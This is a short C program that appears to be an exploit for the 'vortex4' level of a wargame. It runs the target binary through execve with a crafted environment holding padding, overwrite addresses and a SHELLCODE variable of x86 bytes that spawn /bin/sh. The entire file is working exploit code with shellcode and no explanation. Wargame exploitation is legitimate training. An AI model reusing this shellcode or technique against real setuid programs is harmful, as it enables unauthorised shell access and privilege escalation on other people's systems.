#include <unistd.h>

int main(void) {
	char *environment[19] = {"AAAA", "BBBB", "CCCC", "DDDD", "EEEE", "FFFF", "GGGG", "HHHH", "IIII", "AAAABBBBCCCCDDDD\xbc\xdf\xff\xff", "KKKK", "LLLL", "MMMM", "NNNN", "OOOO", "PPPP", "WANTTOUSETHIS", "SHELLCODE=\x50\xd4\xff\xff\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x89\xe5\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x8d\x0c\x24\x31\xc0\x50\x51\x8b\x1c\x24\x89\xe1\xb0\x0b\xcd\x80", 0};
	char *argv[2] = {"./vortex4", 0};
	char *empty[] = {NULL};
	execve("./vortex4", empty, environment);
 }
